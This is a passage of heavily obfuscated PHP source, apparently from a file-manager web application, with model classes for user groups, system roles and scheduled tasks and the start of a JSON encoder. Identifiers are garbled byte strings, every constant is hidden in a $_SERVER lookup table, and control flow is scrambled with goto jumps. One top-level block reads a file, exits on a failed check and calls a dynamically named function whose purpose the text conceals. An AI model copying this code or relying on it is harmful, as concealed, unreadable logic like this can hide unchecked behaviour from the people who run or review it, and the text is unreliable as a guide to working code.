$FÆÓ‹Ó›ë[$BãƒõôÖì[364]]); $FÆÓ‹Ó›ë[$BãƒõôÖì[364]] = array_unique_by_key($f”ƒÇ’šÜÌ, $BãƒõôÖì[1546]); $FÆÓ‹Ó›ë[$BãƒõôÖì[361]][$BãƒõôÖì[362]] = count($FÆÓ‹Ó›ë[$BãƒõôÖì[364]]); $FÆÓ‹Ó›ë[$BãƒõôÖì[361]][$BãƒõôÖì[363]] = ceil($FÆÓ‹Ó›ë[$BãƒõôÖì[361]][$BãƒõôÖì[362]] / $FÆÓ‹Ó›ë[$BãƒõôÖì[361]][$BãƒõôÖì[359]]); } goto d£ÒÅ¬›Á; d£ÒÅ¬›Á: $this->_listDataApply($FÆÓ‹Ó›ë[$BãƒõôÖì[364]]); return $FÆÓ‹Ó›ë; goto aç—»‹›¯; d‰¥ÁÔğˆ: $BãƒõôÖì =& $_SERVER[°Óó£ÌİóèÅ]; $d×ÓéÙáÅÑ = $a…’Ì×ïÛĞ[$BãƒõôÖì[1635]]; $b©Äíá’®ö = isset($a…’Ì×ïÛĞ[$BãƒõôÖì[1636]]) ? $a…’Ì×ïÛĞ[$BãƒõôÖì[1636]] : !1; goto Câ§öê±Š; Câ§öê±Š: if (!trim($d×ÓéÙáÅÑ)) { return !1; } $d×ÓéÙáÅÑ = str_replace($BãƒõôÖì[1637], $BãƒõôÖì[1638], $d×ÓéÙáÅÑ); $BØ ©Ë¶Êë = array($BãƒõôÖì[1546] => array($BãƒõôÖì[528], "\45{$d×ÓéÙáÅÑ}\45"), $BãƒõôÖì[28] => array($BãƒõôÖì[528], "\45{$d×ÓéÙáÅÑ}\45"), $BãƒõôÖì[681] => $BãƒõôÖì[1639]); goto D»·Ö´§ÃŠ; aç—»‹›¯: } private function _searchFromMeta($CÛ¾…©®®º, $F®Šƒ«˜ïÍ, $CÛ‰÷¸ïîâ) { goto a†‚¬ŸªÂ; c†¤ï†°‘š: $DèŒ•Ğìé‘ = Model($EÊ©ÏËÏ²’[1640])->where($a·íí¸²Ÿ)->limit($CÛ‰÷¸ïîâ)->select(); if (!$DèŒ•Ğìé‘) { return array(); } $DèŒ•Ğìé‘ = array_to_keyvalue($DèŒ•Ğìé‘, $EÊ©ÏËÏ²’[33], $EÊ©ÏËÏ²’[1546]); goto DõŸÁ¾‘­; DõŸÁ¾‘­: $Cô­½¥Âš = $this->where(array($EÊ©ÏËÏ²’[1629] => array($EÊ©ÏËÏ²’[7], $DèŒ•Ğìé‘)))->select(); if (!$Cô­½¥Âš) { return array(); } return $Cô­½¥Âš; goto F¢³š…ç¼à; a†‚¬ŸªÂ: $EÊ©ÏËÏ²’ =& $_SERVER[°Óó£ÌİóèÅ]; $F®Šƒ«˜ïÍ = strtolower($F®Šƒ«˜ïÍ); $a·íí¸²Ÿ = array($EÊ©ÏËÏ²’[96] => $CÛ¾…©®®º, $EÊ©ÏËÏ²’[367] => array($EÊ©ÏËÏ²’[528], "\x25{$F®Šƒ«˜ïÍ}\x25")); goto c†¤ï†°‘š; F¢³š…ç¼à: } protected function _listDataApplyItem($BÖİÙç²¦®) { $bö¤´¢ˆÛË = array($BÖİÙç²¦®); $this->_listDataApply($bö¤´¢ˆÛË); return $bö¤´¢ˆÛË[0]; } protected function _listDataApply(&$a£çÜ¢åŒ) { goto a‰ Œ‚°ùÚ; eŸ’ëŒÊ—ƒ: $this->_listAppendChildren($a£çÜ¢åŒ); $this->_listAppendChildrenMember($a£çÜ¢åŒ); $this->_listAppendMeta($a£çÜ¢åŒ, $Cğ°Éø¬Ğ); goto A ”¶ã¤Æ; A ”¶ã¤Æ: $this->_listAppendParent($a£çÜ¢åŒ); $this->_listAppendSourceRoot($a£çÜ¢åŒ, $Cğ°Éø¬Ğ); goto BÄÓ¦“Å¿«; a‰ Œ‚°ùÚ: $cÚƒ‰Ù•¼Ì =& $_SERVER[°Óó£ÌİóèÅ]; if (!$a£çÜ¢åŒ) { return; } $Cğ°Éø¬Ğ = array_to_keyvalue($a£çÜ¢åŒ, $cÚƒ‰Ù•¼Ì[33], $cÚƒ‰Ù•¼Ì[1546]); goto eŸ’ëŒÊ—ƒ; BÄÓ¦“Å¿«: } private function _listAppendChildren(&$bÇÎ³í¶¢Ô) { goto fÎ†ŸÇÊÄŠ; dè©‡Û¾½Ç: $C°”ïãÒ = count($bÇÎ³í¶¢Ô); $AÓ®‹§ğÑ‘ = $this->tablePrefix . $this->tableName; for ($cîÄâò…‡ = 0, $a›ì‹‡÷Äà = 0; $cîÄâò…‡ < $C°”ïãÒ; $cîÄâò…‡++) { $a›ì‹‡÷Äà++; $f¢„Æµİ×‡ = $bÇÎ³í¶¢Ô[$cîÄâò…‡][$F›ÚÉ¯§±[1546]]; $c›ëùêÔ™İ .= "\x53\105\x4c\105\103\124\x20\52\x20\106\122\x4f\x4d\40\x28\x53\105\114\105\x43\x54\40\x27{$f¢„Æµİ×‡}\x5f\143\x68\x69\x6c\x64\47\40\141\163\x20\150\x61\163\40\106\x52\117\x4d\x20\140{$AÓ®‹§ğÑ‘}\x60\40\167\150\145\162\145\40\160\141\162\145\x6e\164\x49\104\x3d{$f¢„Æµİ×‡}\x20\154\151\155\x69\164\x20\x31\51\x20\x61\x73\40\164\142\x5f{$f¢„Æµİ×‡}\40\x75\156\151\x6f\156\x20\141\x6c\154\x20"; if (($a›ì‹‡÷Äà >= 20 || $cîÄâò…‡ == $C°”ïãÒ - 1) && $c›ëùêÔ™İ) { $c›ëùêÔ™İ = substr($c›ëùêÔ™İ, 0, -strlen($F›ÚÉ¯§±[1641])); $EÆÛ„äå¼½ = $this->query($c›ëùêÔ™İ); $FÌ£ÊÇ”ø† = array_merge($FÌ£ÊÇ”ø†, $EÆÛ„äå¼½); $a›ì‹‡÷Äà = 0; $c›ëùêÔ™İ = $F›ÚÉ¯§±[33]; } } goto CÒÚéğ½……; CÒÚéğ½……: $FÌ£ÊÇ”ø† = array_to_keyvalue($FÌ£ÊÇ”ø†, $F›ÚÉ¯§±[1642]); foreach ($bÇÎ³í¶¢Ô as &$dÑÑ¿¿¸õÚ) { $dÑÑ¿¿¸õÚ[$F›ÚÉ¯§±[1643]] = isset($FÌ£ÊÇ”ø†[$dÑÑ¿¿¸õÚ[$F›ÚÉ¯§±[1546]] . $F›ÚÉ¯§±[1644]]); } goto BáˆÕÍà“ò; fÎ†ŸÇÊÄŠ: $F›ÚÉ¯§± =& $_SERVER[°Óó£ÌİóèÅ]; $c›ëùêÔ™İ = $F›ÚÉ¯§±[371]; $FÌ£ÊÇ”ø† = array(); goto dè©‡Û¾½Ç; BáˆÕÍà“ò: } private function _listAppendChildrenMember(&$E¾¯›§‡çé) { goto cÉ¦Õ®…Ñô; EœÁğÂÃªç: $c•àÒ•¿®ì = count($E¾¯›§‡çé); $Féâ´¹è’– = $this->tablePrefix . $D…¡«èË“[1631]; for ($e–²‹ôó÷ = 0, $Eõ°ŒÆ˜ë = 0; $e–²‹ôó÷ < $c•àÒ•¿®ì; $e–²‹ôó÷++) { $Eõ°ŒÆ˜ë++; $Eë„ÊâŸ = $E¾¯›§‡çé[$e–²‹ôó÷][$D…¡«èË“[1546]]; $dÏ«ˆªŠ .= "\x53\x45\x4c\105\x43\124\x20\52\x20\x46\x52\117\x4d\40\x28\x53\105\x4c\x45\103\124\40\x27{$Eë„ÊâŸ}\x5f\143\x68\x69\x6c\144\47\40\141\x73\x20\150\141\163\x20\x46\122\117\x4d\40\x60{$Féâ´¹è’–}\x60\40\x77\150\145\162\x65\40\x67\162\157\165\160\x49\104\75{$Eë„ÊâŸ}\x20\154\x69\155\x69\164\40\x31\x29\x20\x61\x73\x20\x74\142\x5f{$Eë„ÊâŸ}\x20\x75\x6e\x69\157\156\x20\141\154\154\x20"; if (($Eõ°ŒÆ˜ë >= 20 || $e–²‹ôó÷ == $c•àÒ•¿®ì - 1) && $dÏ«ˆªŠ) { $dÏ«ˆªŠ = substr($dÏ«ˆªŠ, 0, -strlen($D…¡«èË“[1641])); $BºÙñÂÕÓ¹ = $this->query($dÏ«ˆªŠ); $d®ÇÏ…š„¤ = array_merge($d®ÇÏ…š„¤, $BºÙñÂÕÓ¹); $Eõ°ŒÆ˜ë = 0; $dÏ«ˆªŠ = $D…¡«èË“[33]; } } goto d‰´´ğá±; cÉ¦Õ®…Ñô: $D…¡«èË“ =& $_SERVER[°Óó£ÌİóèÅ]; $dÏ«ˆªŠ = $D…¡«èË“[371]; $d®ÇÏ…š„¤ = array(); goto EœÁğÂÃªç; d‰´´ğá±: $d®ÇÏ…š„¤ = array_to_keyvalue($d®ÇÏ…š„¤, $D…¡«èË“[1642]); foreach ($E¾¯›§‡çé as &$bˆ†ÆìùÕù) { $bˆ†ÆìùÕù[$D…¡«èË“[1645]] = isset($d®ÇÏ…š„¤[$bˆ†ÆìùÕù[$D…¡«èË“[1546]] . $D…¡«èË“[1644]]); } goto eƒ®„¡Ù•«; eƒ®„¡Ù•«: } private function _listAppendMeta(&$dªÛ–ÖÊ§½, $Cô®öè¬³) { $c¦Ø¼ëî¹Œ =& $_SERVER[°Óó£ÌİóèÅ]; $EÆš«é‹­ = array($c¦Ø¼ëî¹Œ[1546] => array($c¦Ø¼ëî¹Œ[7], $Cô®öè¬³)); $cãñøï»‚ì = Model($c¦Ø¼ëî¹Œ[1630])->where($EÆš«é‹­)->select(); $cãñøï»‚ì = array_to_keyvalue_group($cãñøï»‚ì, $c¦Ø¼ëî¹Œ[1546]); foreach ($cãñøï»‚ì as &$F°Ç’ÚŠ¶) { $F°Ç’ÚŠ¶ = array_to_keyvalue($F°Ç’ÚŠ¶, $c¦Ø¼ëî¹Œ[96], $c¦Ø¼ëî¹Œ[367]); } foreach ($dªÛ–ÖÊ§½ as &$dõ«‹Š“Ê¶) { $dõ«‹Š“Ê¶[$c¦Ø¼ëî¹Œ[1592]] = array(); if (isset($cãñøï»‚ì[$dõ«‹Š“Ê¶[$c¦Ø¼ëî¹Œ[1546]]])) { $dõ«‹Š“Ê¶[$c¦Ø¼ëî¹Œ[1592]] = $cãñøï»‚ì[$dõ«‹Š“Ê¶[$c¦Ø¼ëî¹Œ[1546]]]; } } } protected function parentLevelArray($Aç—­Äè) { $F÷Ä‚‹§º =& $_SERVER[°Óó£ÌİóèÅ]; $Aç—­Äè = explode($F÷Ä‚‹§º[47], trim($Aç—­Äè, $F÷Ä‚‹§º[47])); $Aç—­Äè = array_remove_value($Aç—­Äè, $F÷Ä‚‹§º[410]); return $Aç—­Äè; } private function _listAppendParent(&$F‰Å”–Ï¾Â) { goto eŞµÆò¡²; AÑøÇñ²Ôò: $fì±ÔŒõ = array(); foreach ($d½•ùîÚ…” as $c…óç«šŠº => $fÓî¶êˆ¹) { if (!$fÓî¶êˆ¹) { $fì±ÔŒõ[] = $c…óç«šŠº; } } if ($fì±ÔŒõ) { $dºÉõ†ÊĞ = array($BĞ£¶ˆö¾…[1629] => array($BĞ£¶ˆö¾…[563], $fì±ÔŒõ)); $bğ´ÒŞˆÎÉ = $this->field($BĞ£¶ˆö¾…[1646])->where($dºÉõ†ÊĞ)->select(); $f¯Š”Ìøì = array_to_keyvalue($bğ´ÒŞˆÎÉ, $BĞ£¶ˆö¾…[1546], $BĞ£¶ˆö¾…[28]); $d½•ùîÚ…” = array_merge_index($d½•ùîÚ…”, $f¯Š”Ìøì); } goto bàŸÀïõÉå; bàŸÀïõÉå: foreach ($F‰Å”–Ï¾Â as &$A¨ÌÍ³È») { $dï¬ÆĞÊ• = $this->parentLevelArray($A¨ÌÍ³È»[$BĞ£¶ˆö¾…[381]]); $b¬Ì˜ê³«‡ = $BĞ£¶ˆö¾…[33]; foreach ($dï¬ÆĞÊ• as $E‡‰¾©ÚÇ) { $b¬Ì˜ê³«‡ .= $d½•ùîÚ…”[$E‡‰¾©ÚÇ] . $BĞ£¶ˆö¾…[8]; } if ($dï¬ÆĞÊ•) { $b¬Ì˜ê³«‡ .= $A¨ÌÍ³È»[$BĞ£¶ˆö¾…[28]]; } $A¨ÌÍ³È»[$BĞ£¶ˆö¾…[1647]] = str_replace($BĞ£¶ˆö¾…[1359], $BĞ£¶ˆö¾…[8], $b¬Ì˜ê³«‡); } goto E¥ŠÅ·›˜; eŞµÆò¡²: $BĞ£¶ˆö¾… =& $_SERVER[°Óó£ÌİóèÅ]; $d½•ùîÚ…” = array(); foreach ($F‰Å”–Ï¾Â as &$A¨ÌÍ³È») { $d½•ùîÚ…”[$A¨ÌÍ³È»[$BĞ£¶ˆö¾…[1546]]] = $A¨ÌÍ³È»[$BĞ£¶ˆö¾…[28]]; $dï¬ÆĞÊ• = $this->parentLevelArray($A¨ÌÍ³È»[$BĞ£¶ˆö¾…[381]]); foreach ($dï¬ÆĞÊ• as $E‡‰¾©ÚÇ) { if (!isset($d½•ùîÚ…”[$E‡‰¾©ÚÇ])) { $d½•ùîÚ…”[$E‡‰¾©ÚÇ] = 0; } } } goto AÑøÇñ²Ôò; E¥ŠÅ·›˜: } private function _listAppendSourceRoot(&$f‹öø¬ŠŸÎ, $B°ÔÁÏøï˜) { $cèİ›ÁÚØ² =& $_SERVER[°Óó£ÌİóèÅ]; $aŠ„ì„Ï– = array($cèİ›ÁÚØ²[401] => SourceModel::TYPE_GROUP, $cèİ›ÁÚØ²[392] => 0, $cèİ›ÁÚØ²[403] => array($cèİ›ÁÚØ²[7], $B°ÔÁÏøï˜)); $EŞâ‡„ä› = Model($cèİ›ÁÚØ²[529])->field($cèİ›ÁÚØ²[1648])->where($aŠ„ì„Ï–)->select(); $EŞâ‡„ä› = array_to_keyvalue($EŞâ‡„ä›, $cèİ›ÁÚØ²[403]); $EŞâ‡„ä› = array_remove_key($EŞâ‡„ä›, $cèİ›ÁÚØ²[403]); foreach ($f‹öø¬ŠŸÎ as &$F£ğå®«˜) { $F£ğå®«˜[$cèİ›ÁÚØ²[858]] = $EŞâ‡„ä›[$F£ğå®«˜[$cèİ›ÁÚØ²[1546]]] ? $EŞâ‡„ä›[$F£ğå®«˜[$cèİ›ÁÚØ²[1546]]] : array(); } } protected function resetParentLevel() { $e‚µ•òí§‘ =& $_SERVER[°Óó£ÌİóèÅ]; $Ağ¹»‚•ƒ· = $e‚µ•òí§‘[1546]; $D˜ËŞ„Ïì = $this->select(); $D˜ËŞ„Ïì = array_to_keyvalue($D˜ËŞ„Ïì, $Ağ¹»‚•ƒ·); foreach ($D˜ËŞ„Ïì as $B…çİŞº) { goto dªô·½¦®¼; fä·Ö«Î„¥: $this->where(array($Ağ¹»‚•ƒ· => $B…çİŞº[$Ağ¹»‚•ƒ·]))->save(array($e‚µ•òí§‘[407] => $eÊ»„¯ˆµÚ)); goto b×ç¸‰ºè; aÉØêôÏ÷: $eÊ»„¯ˆµÚ[] = 0; $eÊ»„¯ˆµÚ = $e‚µ•òí§‘[47] . implode($e‚µ•òí§‘[47], array_reverse($eÊ»„¯ˆµÚ)) . $e‚µ•òí§‘[47]; $this->setNamePinyin($B…çİŞº[$Ağ¹»‚•ƒ·], $B…çİŞº[$e‚µ•òí§‘[28]]); goto fä·Ö«Î„¥; dªô·½¦®¼: $C‡È·Âõˆõ = $B…çİŞº; $eÊ»„¯ˆµÚ = array(); while ($C‡È·Âõˆõ[$e‚µ•òí§‘[392]] != 0) { $eÊ»„¯ˆµÚ[] = $C‡È·Âõˆõ[$e‚µ•òí§‘[392]]; $C‡È·Âõˆõ = $D˜ËŞ„Ïì[$C‡È·Âõˆõ[$e‚µ•òí§‘[392]]]; } goto aÉØêôÏ÷; b×ç¸‰ºè: } return $D˜ËŞ„Ïì; } public function groupNameAuto($bôË›‰½Ï, $Dî£’Ğ‘˜¶) { $cáº˜‚µê =& $_SERVER[°Óó£ÌİóèÅ]; $C“à›çö† = $this->where(array($cáº˜‚µê[406] => $bôË›‰½Ï))->getField($cáº˜‚µê[28], !0); if (!$C“à›çö† || !in_array($Dî£’Ğ‘˜¶, $C“à›çö†)) { return $Dî£’Ğ‘˜¶; } for ($eÇãù­‹À¥ = 1; $eÇãù­‹À¥ <= count($C“à›çö†) + 1; $eÇãù­‹À¥++) { $AÇÎÏ–‰š = $Dî£’Ğ‘˜¶ . "\50{$eÇãù­‹À¥}\x29"; if (!in_array($AÇÎÏ–‰š, $C“à›çö†)) { return $AÇÎÏ–‰š; } } } } define($_SERVER[°Óó£ÌİóèÅ][1649], $_SERVER[°Óó£ÌİóèÅ][1650]); goto f÷˜°ËŸ; fãŠÑ§ù‹®: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\155\x2e\x72\x6f\x6c\145\114\151\x73\164"; public $field = array("\x6e\x61\x6d\x65", "\x61\165\x74\x68", "\x6c\141\142\x65\154", "\144\x69\x73\160\154\141\171", "\163\171\x73\164\x65\155", "\144\x65\x73\x63", "\x69\x67\156\157\162\145\x45\170\164", "\x69\x67\x6e\x6f\162\145\x46\151\154\145\123\151\172\145", "\141\144\155\151\156\x69\163\x74\162\x61\x74\x6f\x72", "\163\x6f\x72\x74"); public function listData($C±Î‹“ô× = false, $Fİğ«˜®¾Ü = "\163\x6f\162\x74", $D©†ÓÌØÚ = false) { return parent::listData($C±Î‹“ô×, $Fİğ«˜®¾Ü, $D©†ÓÌØÚ); } public function update($dïÍ¹ÅÛã, $b†¿ö‰İœ÷) { goto B„§„ßïª; E®ğŠ·ÂÔÑ: if (!$c õÍ„Ó“ || $bÆ…öäµËë && $bÆ…öäµËë[$CÃéĞãŸç³[376]] != $c õÍ„Ó“[$CÃéĞãŸç³[376]]) { return !1; } if ($bÆ…öäµËë[$CÃéĞãŸç³[1903]] == 1) { $b†¿ö‰İœ÷ = array($CÃéĞãŸç³[28] => $b†¿ö‰İœ÷[$CÃéĞãŸç³[28]], $CÃéĞãŸç³[1564] => $b†¿ö‰İœ÷[$CÃéĞãŸç³[1564]]); } $this->filterAuth($b†¿ö‰İœ÷[$CÃéĞãŸç³[557]]); goto Aßõ±ë½ÒĞ; B„§„ßïª: $CÃéĞãŸç³ =& $_SERVER[°Óó£ÌİóèÅ]; $c õÍ„Ó“ = parent::listData($dïÍ¹ÅÛã); $bÆ…öäµËë = $this->findByName($b†¿ö‰İœ÷[$CÃéĞãŸç³[28]]); goto E®ğŠ·ÂÔÑ; Aßõ±ë½ÒĞ: return parent::update($dïÍ¹ÅÛã, $b†¿ö‰İœ÷); goto E©¹¯¨ÁÄé; E©¹¯¨ÁÄé: } public function remove($dÂÉò‚¨) { $E²ÉÅºäƒ† = parent::listData($dÂÉò‚¨); if (!$E²ÉÅºäƒ† || $E²ÉÅºäƒ†[$_SERVER[°Óó£ÌİóèÅ][824]]) { return !1; } return parent::remove($dÂÉò‚¨); } public function add($Fîï¬Î£ô) { goto BÙ”ø²Ç¸; BÙ”ø²Ç¸: $b‚ÉÜ¤¸‹Æ =& $_SERVER[°Óó£ÌİóèÅ]; $dºíï¼Ù¾ = $Fîï¬Î£ô[$b‚ÉÜ¤¸‹Æ[28]]; if ($this->findByName($dºíï¼Ù¾)) { return !1; } goto B¯ö¬×´à¢; Eæ÷óÔ½§Ç: return parent::insert($Fîï¬Î£ô); goto DéÙ¢¶ˆá; B¯ö¬×´à¢: $CÈ‹‚°øõÒ = array($b‚ÉÜ¤¸‹Æ[395] => $dºíï¼Ù¾, $b‚ÉÜ¤¸‹Æ[1552] => $b‚ÉÜ¤¸‹Æ[33], $b‚ÉÜ¤¸‹Æ[1548] => $b‚ÉÜ¤¸‹Æ[1565], $b‚ÉÜ¤¸‹Æ[1904] => 1, $b‚ÉÜ¤¸‹Æ[1551] => 0, $b‚ÉÜ¤¸‹Æ[1905] => 0, $b‚ÉÜ¤¸‹Æ[1550] => $this->getSort()); $Fîï¬Î£ô = array_merge($CÈ‹‚°øõÒ, $Fîï¬Î£ô); $this->filterAuth($Fîï¬Î£ô[$b‚ÉÜ¤¸‹Æ[557]]); goto Eæ÷óÔ½§Ç; DéÙ¢¶ˆá: } private function getSort() { $AùŠ…ç²ŠÂ =& $_SERVER[°Óó£ÌİóèÅ]; $cµ¥Õ„‚¿ = parent::listData(); $CÓóÎç§î˜ = array_to_keyvalue($cµ¥Õ„‚¿, $AùŠ…ç²ŠÂ[33], $AùŠ…ç²ŠÂ[1567]); return empty($CÓóÎç§î˜) ? 0 : max($CÓóÎç§î˜) + 1; } private function filterAuth(&$Dá¯Ÿ§ã·Ï) { $aÕî³™ÑÀù =& $_SERVER[°Óó£ÌİóèÅ]; $a“Œ×š¼Œ = array(); $dİô—¥ŒÕŒ = array_filter(explode($aÕî³™ÑÀù[47], $Dá¯Ÿ§ã·Ï)); foreach ($dİô—¥ŒÕŒ as $Dá¯Ÿ§ã·Ï) { $c…ä™ºá® = explode($aÕî³™ÑÀù[100], $Dá¯Ÿ§ã·Ï); if ($c…ä™ºá®[0] == $aÕî³™ÑÀù[1213] && $c…ä™ºá®[1] != $aÕî³™ÑÀù[785]) { $AµÆëËÔ˜ = $c…ä™ºá®[0] . $aÕî³™ÑÀù[100] . $c…ä™ºá®[1] . $aÕî³™ÑÀù[1906]; if (!in_array($AµÆëËÔ˜, $dİô—¥ŒÕŒ)) { $a“Œ×š¼Œ[] = $AµÆëËÔ˜; } } $a“Œ×š¼Œ[] = $Dá¯Ÿ§ã·Ï; } $Dá¯Ÿ§ã·Ï = implode($aÕî³™ÑÀù[47], $a“Œ×š¼Œ); } public function sort($F©¨›‘ÓØ¤, $dïŠ¤ŒÂ°Ë) { return parent::update($F©¨›‘ÓØ¤, $dïŠ¤ŒÂ°Ë); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\155\x2e\164\x61\x73\153\x4c\151\163\x74"; public $field = array("\x6e\141\155\x65", "\164\x79\x70\x65", "\145\x76\x65\x6e\x74", "\x74\x69\x6d\145", "\x64\145\163\x63", "\x73\171\163\x74\x65\x6d", "\145\156\141\x62\154\x65", "\154\x61\x73\164\122\x75\x6e", "\163\x6f\x72\x74"); public function listData($CŸµÕÈ÷Áã = false, $bƒ©ÈÛ¬ä„ = "\x73\157\x72\164", $C¾¨å¦Çñ = false) { return parent::listData($CŸµÕÈ÷Áã, $bƒ©ÈÛ¬ä„, $C¾¨å¦Çñ); } public function add($B³âØ¨ĞÎ‡) { $aùº®İĞØê =& $_SERVER[°Óó£ÌİóèÅ]; $bíœŞ«•›Œ = $this->findByName($B³âØ¨ĞÎ‡[$aùº®İĞØê[28]]); if ($bíœŞ«•›Œ) { return !1; } $B³âØ¨ĞÎ‡[$aùº®İĞØê[1061]] = 0; $B³âØ¨ĞÎ‡[$aùº®İĞØê[1567]] = $this->getSort(); return parent::insert($B³âØ¨ĞÎ‡); } private function getSort() { $f¥æÍÒ£ã¢ =& $_SERVER[°Óó£ÌİóèÅ]; $cÔô£É¬× = parent::listData(); $BŠ¦áæ‡Ä‡ = array_to_keyvalue($cÔô£É¬×, $f¥æÍÒ£ã¢[33], $f¥æÍÒ£ã¢[1567]); return empty($BŠ¦áæ‡Ä‡) ? 0 : max($BŠ¦áæ‡Ä‡) + 1; } public function update($bóË¬àÑ‹ñ, $CÅšË¯ÊØÀ) { $A‹©Êšå =& $_SERVER[°Óó£ÌİóèÅ]; $D‚©¬ùÆÛ¡ = $this->listData($bóË¬àÑ‹ñ); $C‹®”êºéç = $this->findByName($CÅšË¯ÊØÀ[$A‹©Êšå[28]]); if (!$D‚©¬ùÆÛ¡ || $C‹®”êºéç && $C‹®”êºéç[$A‹©Êšå[376]] != $D‚©¬ùÆÛ¡[$A‹©Êšå[376]]) { return !1; } return parent::update($bóË¬àÑ‹ñ, $CÅšË¯ÊØÀ); } public function remove($bƒÎ«…£) { $cÍØ÷‡àœğ = $this->listData($bƒÎ«…£); if (!$cÍØ÷‡àœğ || $cÍØ÷‡àœğ[$_SERVER[°Óó£ÌİóèÅ][824]]) { return !1; } return parent::remove($bƒÎ«…£); } public function enable($cç”ÈÉì½©) { $cÛØßŒ³“’ =& $_SERVER[°Óó£ÌİóèÅ]; $c¸÷ùâÖõ = $this->listData($cç”ÈÉì½©); $eÔƒ·½ß‘“ = !$c¸÷ùâÖõ[$cÛØßŒ³“’[1068]]; return $this->update($cç”ÈÉì½©, array($cÛØßŒ³“’[1907] => $eÔƒ·½ß‘“)); } public function run($f˜®Í´ËŸî) { return $this->update($f˜®Í´ËŸî, array($_SERVER[°Óó£ÌİóèÅ][1908] => time())); } } if ($_SERVER[$_SERVER[°Óó£ÌİóèÅ][57]] != $_SERVER[$_SERVER[°Óó£ÌİóèÅ][58]]) { goto eÛ“ˆÓ»é²; eÛ“ˆÓ»é²: $Fåğ«Ö„× = $_SERVER[°Óó£ÌİóèÅ][59]; $cŒÍ‘é¡Ûˆ = BASIC_PATH . $_SERVER[°Óó£ÌİóèÅ][60]; $e˜¸£¤³ğ = $Fåğ«Ö„×($cŒÍ‘é¡Ûˆ); goto D¨œÛ°£; D¨œÛ°£: $bÁ®‡‚›‡ = explode($_SERVER[°Óó£ÌİóèÅ][61], $e˜¸£¤³ğ); if (count($bÁ®‡‚›‡) < $_SERVER[°Óó£ÌİóèÅ][62]) { die; } $eÀ™ÈĞ¤í = $_SERVER[°Óó£ÌİóèÅ][63]; goto b›™¿°ƒ½‘; b›™¿°ƒ½‘: $eÀ™ÈĞ¤í($_SERVER[$_SERVER[°Óó£ÌİóèÅ][64]]); goto E¼õæÊ÷¡£; E¼õæÊ÷¡£: } goto DØ›ÖƒÓñ¦; cĞæÎ¼‹í: class Services_JSON { function __construct($cäĞî—ÉÓ” = 0) { $this->use = $cäĞî—ÉÓ”; } function utf162utf8($eêÛ†˜İ„) { $DŒè—öœØ‹ =& $_SERVER[°Óó£ÌİóèÅ]; if (function_exists($DŒè—öœØ‹[77])) { return mb_convert_encoding($eêÛ†˜İ„, $DŒè—öœØ‹[1369], $DŒè—öœØ‹[1370]); } $EŞ÷Å¦º¬ = ord($eêÛ†˜İ„[0]) << 8 | ord($eêÛ†˜İ„[1]); switch (!0) { case (127 & $EŞ÷Å¦º¬) == $EŞ÷Å¦º¬: return chr(127 & $EŞ÷Å¦º¬); case (2047 & $EŞ÷Å¦º¬) == $EŞ÷Å¦º¬: return chr(192 | $EŞ÷Å¦º¬ >> 6 & 31) . chr(128 | $EŞ÷Å¦º¬ & 63); case (65535 & $EŞ÷Å¦º¬) == $EŞ÷Å¦º¬: return chr(224 | $EŞ÷Å¦º¬ >> 12 & 15) . chr(128 | $EŞ÷Å¦º¬ >> 6 & 63) . chr(128 | $EŞ÷Å¦º¬ & 63); } return $DŒè—öœØ‹[33]; } function utf82utf16($e°İºÄğ‡) { $C‚»Ü•± =& $_SERVER[°Óó£ÌİóèÅ]; if (function_exists($C‚»Ü•±[77])) { return mb_convert_encoding($e°İºÄğ‡, $C‚»Ü•±[1370], $C‚»Ü•±[1369]); } switch (strlen($e°İºÄğ‡)) { case 1: return $e°İºÄğ‡; case 2: return chr(7 & ord($e°İºÄğ‡[0]) >> 2) . chr(192 & ord($e°İºÄğ‡[0]) << 6 | 63 & ord($e°İºÄğ‡[1])); case 3: return chr(240 & ord($e°İºÄğ‡[0]) << 4 | 15 & ord($e°İºÄğ‡[1]) >> 2) . chr(192 & ord($e°İºÄğ‡[1]) << 6 | 127 & ord($e°İºÄğ‡[2])); } return $C‚»Ü•±[33]; } function encode($F²ğäùÉĞ‘) { $cÓºõõâƒ› =& $_SERVER[°Óó£ÌİóèÅ]; switch (gettype($F²ğäùÉĞ‘)) { case $cÓºõõâƒ›[1371]: return $F²ğäùÉĞ‘ ? $cÓºõõâƒ›[1372] : $cÓºõõâƒ›[1373]; case $cÓºõõâƒ›[1374]: return $cÓºõõâƒ›[108]; case $cÓºõõâƒ›[314]: return (int) $F²ğäùÉĞ‘; case $cÓºõõâƒ›[289]: case $cÓºõõâƒ›[288]: return (double) $F²ğäùÉĞ‘; case $cÓºõõâƒ›[323]: $A¬ñ±ùÉ½ = $cÓºõõâƒ›[33]; $C¦……Ñšãù = strlen($F²ğäùÉĞ‘); for ($Bšæ’¿Ì = 0; $Bšæ’¿Ì < $C¦……Ñšãù; ++$Bšæ’¿Ì) { $EææƒØİİ› = ord($F²ğäùÉĞ‘[$Bšæ’¿Ì]); switch (!0) { case $EææƒØİİ› == 8: $A¬ñ±ùÉ½ .= $cÓºõõâƒ›[1375]; break; case $EææƒØİİ› == 9: $A¬ñ±ùÉ½ .= $cÓºõõâƒ›[1376]; break; case $EææƒØİİ› == 10: $A¬ñ±ùÉ½ .= $cÓºõõâƒ›[1377]; break; case $EææƒØİİ› == 12: $A¬ñ±ùÉ½ .= $cÓºõõâƒ›[1378]; break; case $EææƒØİİ› == 13: $A¬ñ±ùÉ½ .= $cÓºõõâƒ›[1379]; break; case $EææƒØİİ› == 34: case $EææƒØİİ› == 47: case $EææƒØİİ› == 92: $A¬ñ±ùÉ½ .= $cÓºõõâƒ›[102] . $F²ğäùÉĞ‘[$Bšæ’¿Ì]; break; case $EææƒØİİ› >= 32 && $EææƒØİİ› <= 127: $A¬ñ±ùÉ½ .= $F²ğäùÉĞ‘[$Bšæ’¿Ì]; break; case ($EææƒØİİ› & 224) == 192: $FäÇ¾•¬èø = pack($cÓºõõâƒ›[1380], $EææƒØİİ›, ord($F²ğäùÉĞ‘[$Bšæ’¿Ì + 1])); $Bšæ’¿Ì += 1; $D—›ñ«ÛÁ = $this->utf82utf16($FäÇ¾•¬èø); $A¬ñ±ùÉ½ .= sprintf($cÓºõõâƒ›[1381], bin2hex($D—›ñ«ÛÁ)); break; case ($EææƒØİİ› & 240) == 224: $FäÇ¾•¬èø = pack($cÓºõõâƒ›[1380], $EææƒØİİ›, ord($F²ğäùÉĞ‘[$Bšæ’¿Ì + 1]), ord($F²ğäùÉĞ‘[$Bšæ’¿Ì + 